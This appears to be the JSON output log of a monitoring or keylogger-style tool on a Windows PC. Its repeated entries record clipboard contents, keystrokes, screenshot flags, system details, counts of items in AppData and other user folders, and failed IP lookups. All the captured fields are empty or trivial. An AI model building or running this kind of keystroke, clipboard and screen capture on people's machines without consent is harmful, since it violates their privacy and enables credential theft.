{"timestamp": "2025-06-14T06:49:09.942782+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137110>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "56f9523aeb5c346a9599cad493970fee03fda29e895cb81cd6646bba6d6aa5bf", "_raw_log_hash": "01b52a18fcb0161470b97282feeff3d9bcc000e6082582900b8d52d9d4adfb72"}
{"timestamp": "2025-06-14T06:49:23.514549+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "0c0ad5243e2aa47e79173fef0f611aa39953d19c6e347990119b3c90516bbd83", "_raw_log_hash": "530afd6c3d3bdaa273158d29427e535a28c7455c29c684120284563eedf1d647"}
{"timestamp": "2025-06-14T06:49:36.993528+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "24de1238bcc5a9ac68b7a686bfea117f16375c96ca709ad8597ea7f6ec87234c", "_raw_log_hash": "24ec624f3ca87b6242e9340baec5d6fc31749419d790244efe148344ec96be27"}
{"timestamp": "2025-06-14T06:49:50.662687+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "fdfe42c42bf3f15d44d632648d51af3b03bff2e80a2df7e3e8eb6a516eae0fd5", "_raw_log_hash": "24701e0744796794778aafba1490a83f0891c2566c19b3af86debf99a23e4c9f"}
{"timestamp": "2025-06-14T06:50:04.136541+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33C690>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "5badc4e5f1d64e714c54b59a56ac584e73cca381555a534025bd8ea70ae61c61", "_raw_log_hash": "961f0323f26101d336ecd17ee9f98d219ba7a58a52ad41f182355e34bade9f4b"}
{"timestamp": "2025-06-14T06:50:17.691977+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "84f983ba478c4c4fce84f2b19494ae867d39bc24452b946ca32aceec5b941d95", "_raw_log_hash": "d238402652b6e9bbb29472c3b11265dace193368a26be3a7c72bd2860941f6ce"}
{"timestamp": "2025-06-14T06:50:31.224206+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137D90>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "8cc32f5fe0647156995d4b7cae1cdea73091e714e7480ca33eb8e6a9a2127128", "_raw_log_hash": "936c9c6b3a871aa38ad915cb8393e7e65e90867a282e89a17c2cedc5cd3b86f0"}
{"timestamp": "2025-06-14T06:50:44.722765+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33CB90>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "f4748714c864d796a66c332d8b2a2e6ea096f390125d231b7fecd38e3e438923", "_raw_log_hash": "23a3c7faa09c7f21470be843a1680883ac2e4647b9473fb205bc54d44df3f7f3"}
{"timestamp": "2025-06-14T06:50:58.276733+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "9b634a462d96def439ee84db430120fd1f5188070090097f337289b7c93f5871", "_raw_log_hash": "4899f389dc8436fc2b23d462ce5c10f88ea0efc4f2f5a1b1c526b333fac6655b"}
{"timestamp": "2025-06-14T06:51:11.775088+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137110>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "0f5e5621d4146ebd73e173b09703dc717c5a8b615b2a42f00bcf06c541bb6fb9", "_raw_log_hash": "affbfa79cf075108d1a2ae50a88b68252b9a6acfebac12139d09a5aeffc271fe"}
{"timestamp": "2025-06-14T06:51:25.295101+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "31073a6cfefd09f03e9d7b6ed376ce8e9ce856d2f27707228419aab800169234", "_raw_log_hash": "b017d59b34686f611ad29f3f91e207393974a2d679d8102e570bb097cd5fcad3"}
{"timestamp": "2025-06-14T06:51:38.774470+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "27b504e81016bbefa6c79acc0fe336c3d5266a3be9cdb83feae0f979962d07a4", "_raw_log_hash": "c20dc7644d784bf1c849c94d93e67e1f0a4bcd7f0ad9892c777ba157e9674c92"}
{"timestamp": "2025-06-14T06:51:52.231519+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33C910>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "85dcfe626af1d5f09e926fbb4567a6fa9f889d3266a0adc7b49f3b6fc87ddc43", "_raw_log_hash": "deda7c353459b02917ea578030696bdbca3ce85cba73ac6ee5eb8f50203765b7"}
{"timestamp": "2025-06-14T06:52:06.009952+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137D90>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "603dc506aaeb8683a8d61e52f15a2c018b015e6e61fd582d6151889ad36af662", "_raw_log_hash": "f8c73d31a5264d0e27d528a01d6d2d4b6b232a7c763eebbad9f5f3051e76aedf"}
{"timestamp": "2025-06-14T06:52:19.556031+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137C50>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "8e6da9085fb70ce16375921e5504161a9ef5acadd97ae4fc5cbf1bd1c78c939e", "_raw_log_hash": "b3c6b7db3c784ebace0350755a14b90d0b0c75f115ac7ce89d823b0b80392a47"}
{"timestamp": "2025-06-14T06:52:33.050068+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137110>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "2426361b2efe01441fe04a61c6c9d723b8491693ee4082c9246c8aabbc490d98", "_raw_log_hash": "ccc2a262c8309203f7b0bd7aabea18b48fdfcffefd74a6bb00cfb763f27b3a01"}
{"timestamp": "2025-06-14T06:52:46.696982+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "59e215baade2345571016b5d4df6a1b7317ad8909a743dcfad6049426dee85d7", "_raw_log_hash": "8295bc147d94650bfc1fbf553be7358719eb6f412c34584676b5642ea93df576"}
{"timestamp": "2025-06-14T06:53:00.332447+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33F610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "6f39d7655fb2f0aecba8a2a89acad3ea906d39a1fb21a03ef0b6360c0b032d2e", "_raw_log_hash": "6020921fb22ecccbe6e5506ed976b220fbaaef627ad7c59aa61397d610444a20"}
{"timestamp": "2025-06-14T06:53:13.825517+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "ee0e88186016f4eca1ae981a1e944701529878f4eeb24c543c16395c1e4cd423", "_raw_log_hash": "12ad0e1f43ea760b8892fd4ba03b66c4dda463749f9a9bc445a6fd9491947d05"}
{"timestamp": "2025-06-14T06:53:27.312192+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "66f624714fd1a186846ae642f86c51377691d58e349132fe75312f62d7269c80", "_raw_log_hash": "43e3bcb4621b472d0b679a6cd19cf7519f54de4cd5b19f16a48b591e2f48b214"}
{"timestamp": "2025-06-14T06:53:40.843511+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33F250>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "9db4f750fb5d4e137153c1d1c833a7b17043849637eb62900aa16a2103170bc9", "_raw_log_hash": "cd364c31574018ea25a45c93606c6b034bd7e255deed124c18591aa1bb81523e"}
{"timestamp": "2025-06-14T06:53:54.373298+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "937aac73fe6a267f5ec78c9486d08bf803763426116034421cb2b7a8bc1c5443", "_raw_log_hash": "f1e738c9fd81d11374557220001cd737cb1473eef39fc1a68a09bc0b7841ae64"}
{"timestamp": "2025-06-14T06:54:07.893220+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "9c2a72a4b7db39b2658ce072952b49b3501f0de55130b7ee545016dfcd5fcb06", "_raw_log_hash": "b4c9fd716cd3e264c417da703b7db3791147acd60c3bb9367e49dc731a9a2b8c"}
{"timestamp": "2025-06-14T06:54:21.461433+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33FD90>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "6557612e7232b13251a5bc15e1873f3e69b4abc22f800be76875ae6a2c08db86", "_raw_log_hash": "0864f2fa1d80e11f6fceb23745cecf9ead41290fda1bfebfd25371d02c5538a8"}
{"timestamp": "2025-06-14T06:54:34.956879+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137D90>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "f99b5d8c310724349a45c01bcd57d6586cc9bd3b3b18de0f3b39110693933415", "_raw_log_hash": "4eeef10db2dcb4d5b443c4758f85d6e3861502df3313b6a9256a200fd4bfae1c"}
{"timestamp": "2025-06-14T06:54:48.473726+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "9f11f696229c89fc5ea783b3ccc64d2422829ebe0d78a01a46e482229d4081a5", "_raw_log_hash": "2220cd2700acdb821c470488fc767954cc753cd9239e07ecec7cdc7da73456fb"}
